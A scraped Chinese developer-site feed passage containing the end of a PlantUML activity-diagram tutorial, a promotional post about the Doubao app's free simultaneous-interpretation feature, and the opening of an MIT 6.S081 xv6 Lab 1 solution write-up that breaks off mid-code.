<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9ab1a2d43404ddb9eec0621fd91f67a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=tS0MveUzK2LwzsOo8YTUK5Z3Fdo%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>并行（Fork/Join）：外卖下单后并行流程</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
:下单成功;
fork
    :商家接单;
fork again
    :骑手接单;
fork again
    :系统通知用户;
join
:配送中;
:送达;
stop
@enduml
</code></pre>
<ol start="3">
<li>循环：审批驳回重提</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
repeat
    :员工提交申请;
    :经理审批;
    if (通过?) then (no)
        :驳回修改;
    endif
repeat while (未通过)
:归档;
stop
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaaffc1e28cb4fd2a509b7c345eb3c15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=bYLYnkauF1NytQy6gPmDSpVF3GA%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>异常补偿：SAGA 事务</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
:下单;
:扣库存;
if (异常?) then (yes)
    :补偿：恢复库存;
    :补偿：关闭订单;
    stop
endif
:支付;
:发货;
stop
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54b54d55776442848b073ac51f26c629~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=rDL5J505MMvObF%2Bv5kSQwEuNrg0%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>状态机风格：订单状态流转</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
title 订单状态机（活动图视角）
(*) --&gt; "待支付"
"待支付" --&gt; "已支付" : 支付成功
"已支付" --&gt; "已发货" : 商家发货
"已发货" --&gt; "已完成" : 确认收货
"待支付" --&gt; "已取消" : 超时/主动取消
"已完成" --&gt; (*)
@enduml
</code></pre>
<hr/>
<h2 data-id="heading-4">五、如何把图秒变 PPT / Confluence</h2>
<ol>
<li>PlantUML 渲染 → 右键「<strong>下载 PNG/SVG</strong>」→ 拖进 PPT 即可矢量放大。</li>
<li>Mermaid 代码块直接粘到 <strong>Typora / Notion / GitBook</strong> 实时预览。</li>
<li>Draw.io 支持「<strong>链接到 GitHub</strong>」：把 <code>.puml</code> 文件存仓库，Draw.io 通过 URL 导入，自动同步更新。</li>
</ol>
<hr/>
<h2 data-id="heading-5">六、一张脑图总结（保存即可）</h2>
<pre><code class="hljs">类图  =  骨架  =  三层方框 + 关系线
时序图 = 对话  = 生命线 + 箭头 + 激活条
活动图 = 地图  = 圆角动作 + 菱形分支 + 黑棒并行
</code></pre>
<p><strong>记住口诀</strong>：<br/>
“<strong>类图看结构，时序看交互，活动看流程</strong>”——任何业务先问自己「我要看啥？」，再选图，3 分钟就能画出清晰架构。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[免费！豆包又上新功能，吊打付费软件！老罗现场演示！(附使用入口)]]></title>    <link>https://juejin.cn/post/7590071125398290472</link>    <guid>https://juejin.cn/post/7590071125398290472</guid>    <pubDate>2026-01-02T07:53:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398290472" data-draft-id="7590104561475354676" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="免费！豆包又上新功能，吊打付费软件！老罗现场演示！(附使用入口)"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-02T07:53:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员X小鹿"/> <meta itemprop="url" content="https://juejin.cn/user/2928754709505608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            免费！豆包又上新功能，吊打付费软件！老罗现场演示！(附使用入口)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2928754709505608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员X小鹿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:53:08.000Z" title="Fri Jan 02 2026 07:53:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是X小鹿。前几天的「罗永浩科技春晚」，不知道大家有没有看。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf01108028864993a9176bc13780b130~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=QlKuSHurUB6vsxlxk79hns8ecc8%3D" alt="图片" loading="lazy"/></p>
<p>在科技春晚上，老罗展示了豆包最近上线的新功能。</p>
<p>体验了下，效果确实不错，直接吊打一些付费软件，甚至连买翻译耳机大几千的钱都能省了。</p>
<p>这个功能，就是豆包 APP 最近上线的「<strong>同声传译</strong>」。</p>
<p>目前在豆包 APP 上，所有人都可以免费使用。</p>
<p><strong>具体能干啥呢？</strong></p>
<p>比如你出国旅游了，但听不懂他们的语言，那么在交流的时候，就可以打开豆包的同声传译。</p>
<p>它能实时将外语转成中文说出来。（仅仅只有 2~3 秒的时延）</p>
<p>又比如，你想继续和对方交流，但是不会说他们的语言，那么可以直接对豆包说中文。</p>
<p>豆包也能在极短的时延内，将中文转成对方的语言，甚至还<code>克隆了你的音色</code>来说。</p>
<p>就很真实。</p>
<p><strong>支持多种语言的互译</strong></p>
<p>豆包的同声传译，支持中、英、日、德、法、西班牙、葡萄牙、印尼 7 种语言的互译。</p>
<p>而且在中文和英文互译的时候，甚至都不需要自己手动切换，就很方便。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebf990c73e7a4949bbd0732d3b57e806~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=4EsSOBwjI1JaGl8EXj%2BdYnox174%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-0">豆包同声传译入口</h2>
<p>豆包的同声传译在哪里使用呢？</p>
<p>打开豆包 APP，点「打电话」，上面的和下面的都可以。（左图）</p>
<p>进来后，点「选择情景」-「同声传译」，就可以体验了。（右图）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ea701ea389e4389955b9f40632d7c97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=CzwVcIg8RpwrizR0vrMeXhzXsbk%3D" alt="图片" loading="lazy"/></p>
<p>或者也可以直接点「同声传译」进入：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9881c6ad12524bf0b0a9efc8f8c607fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYWOWwj-m5vw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945188&amp;x-signature=YC2xNahes3LnQbPurddTFa350hg%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-1">写在最后</h2>
<p>最后来总结一下吧。</p>
<p>豆包的同声传译，可以让我们在极低的时延下，实现中文和外国语言间的实时翻译，非常适合<code>跨国、跨语言沟通</code>的场景。</p>
<ul>
<li>豆包的同声传译支持 7 种语言的互译</li>
<li>同传时延 2~3 秒</li>
<li>支持克隆音色</li>
<li>适用于出国旅游、跨国会议、观看国外视频 / 在线课程、讲座等场景</li>
<li>完全免费</li>
</ul>
<blockquote>
<p>注：建使用时可以带上耳机，同传体验更好。</p>
</blockquote>
<p>以上就是今天的分享，有需要的可以体验一下。</p>
<hr/>
<blockquote>
<p>我是<a href="https://juejin.cn/user/2928754709505608/posts" title="https://juejin.cn/user/2928754709505608/posts" target="_blank">程序员X小鹿</a>，前互联网大厂程序员，也是一名 AIGC 爱好者，持续分享更多好用的 AI 工具，欢迎一起交流~</p>
</blockquote>
<p><strong>推荐阅读</strong></p>
<p><a href="https://juejin.cn/post/7454501732203610131" title="https://juejin.cn/post/7454501732203610131" target="_blank">2024年终AI工具汇总：9大AI领域，70+精选AI工具，全都在这了！(建议收藏)</a></p>
<p>更多 AI 工具见<a href="https://juejin.cn/column/7284164153576947724" title="https://juejin.cn/column/7284164153576947724" target="_blank">【AI工具】</a>专栏，持续更新中。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MIT 6.S081 Lab 1. Xv6 and Unix utilities]]></title>    <link>https://juejin.cn/post/7590071125398306856</link>    <guid>https://juejin.cn/post/7590071125398306856</guid>    <pubDate>2026-01-02T07:53:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398306856" data-draft-id="7590054976489324584" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MIT 6.S081 Lab 1. Xv6 and Unix utilities"/> <meta itemprop="keywords" content="操作系统"/> <meta itemprop="datePublished" content="2026-01-02T07:53:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="让流萤再次伟大"/> <meta itemprop="url" content="https://juejin.cn/user/4057652418580288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MIT 6.S081 Lab 1. Xv6 and Unix utilities
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4057652418580288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    让流萤再次伟大
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:53:12.000Z" title="Fri Jan 02 2026 07:53:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Lab1</h2>
<h3 data-id="heading-1">Boot xv6 (easy)</h3>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2025
<span class="hljs-built_in">cd</span> xv6-labs-2025
make qemu <span class="hljs-comment"># Build and run xv6</span>
</code></pre>
<p>运行后进入qemu，要退出 qemu，请键入：Ctrl-a x（同时按下Ctrl和a后松开，然后按下x）</p>
<h3 data-id="heading-2">sleep (easy)</h3>
<p>本练习旨在让您熟悉如何在 xv6 上编写用户程序以及<code>pause</code>系统调用。</p>
<blockquote>
<p>为 xv6实现一个用户级<code>睡眠</code>程序，类似于 UNIX 的 sleep 命令。你的<code>睡眠程序应该暂停用户指定的时钟周期数。时钟周期是 xv6 内核定义的一个时间单位，即定时器芯片两次中断之间的时间间隔。你的代码应该写在``user/sleep.c</code>文件中 。</p>
</blockquote>
<p>提示：</p>
<ul>
<li>
<p>在开始编写代码之前，请阅读<a href="https://link.juejin.cn?target=https%3A%2F%2Fpdos.csail.mit.edu%2F6.S081%2F2025%2Fxv6%2Fbook-riscv-rev5.pdf" target="_blank" title="https://pdos.csail.mit.edu/6.S081/2025/xv6/book-riscv-rev5.pdf" ref="nofollow noopener noreferrer">xv6 书</a>的第一章。</p>
</li>
<li>
<p>把你的代码放在<code>user/sleep.c中。看看``user/</code>目录下的其他一些程序 （例如<code>user/echo.c</code>、<code>user/grep.c</code>和<code>user/rm.c</code>），了解命令行参数是如何传递给程序的。</p>
</li>
<li>
<p><code>将您的睡眠</code>程序添加到 Makefile 中的<code>UPROGS</code>；完成此操作后，<code>make qemu</code>将编译您的程序，您就可以从 xv6 shell 运行它。</p>
</li>
<li>
<p>如果用户忘记传递参数，sleep 应该打印错误消息。</p>
</li>
<li>
<p>命令行参数以字符串形式传递；您可以使用<code>atoi</code>将其转换为整数（请参阅 user/ulib.c）。</p>
</li>
<li>
<p>使用系统调用<code>pause()</code>。</p>
</li>
<li>
<p><code>有关实现pause()</code>系统调用的 xv6 内核代码，请参阅<code>kernel/sysproc.c</code>（查找<code>sys_pause</code>）；有关用户程序可调用的<code>pause()</code> 的 C 定义，请参阅<code>user/user.h；有关从用户代码跳转到内核以``调用 pause() 的</code>汇编代码，请参阅<code>user/usys.S</code>。````````````</p>
</li>
<li>
<p>请参阅 Kernighan 和 Ritchie 合著的*《C 程序设计语言》（第二版）*（K&amp;R）一书，了解 C 语言。</p>
</li>
</ul>
<h4 data-id="heading-3">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/stat.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>

<span class="hljs-type">int</span> 
<span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>
{
  <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>) {
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"usage: sleep &lt;time&gt;\n"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  }
  pause(atoi(argv[<span class="hljs-number">1</span>]));
  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-4">sixfive (moderate)</h3>
<p>在本练习中，您将使用系统调用 open 和 read、C 字符串以及在 C 中处理文本文件。</p>
<blockquote>
<p>对于每个输入文件，sixfive必须打印文件中所有 5 或 6 的倍数。数字是由字符串“-\r\t\n./,"”中字符分隔的十进制数字序列。因此，对于“xv6”中的“6”，sixfive 不应该打印 6，而应该打印例如“/6,"”。</p>
</blockquote>
<p>以下示例说明了 sixfive 的行为：</p>
<pre><code class="hljs language-bash" lang="bash">$ sixfive sixfive.txt
5
100
18
6
$
</code></pre>
<p>提示：</p>
<ul>
<li>一次读取一个字符到输入文件。</li>
<li>您可以使用strchr测试字符是否与任何分隔符匹配（请参阅 user/ulib.c）。</li>
<li>文件开头和结尾是隐式分隔符。</li>
</ul>
<h4 data-id="heading-5">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fcntl.h"</span></span>

<span class="hljs-comment">// 定义状态</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ST_READY   0  <span class="hljs-comment">// 准备好接收新数字</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ST_DIGITS  1  <span class="hljs-comment">// 正在读数字</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ST_INVALID 2  <span class="hljs-comment">// 非法字符状态</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">sixfive</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span> {
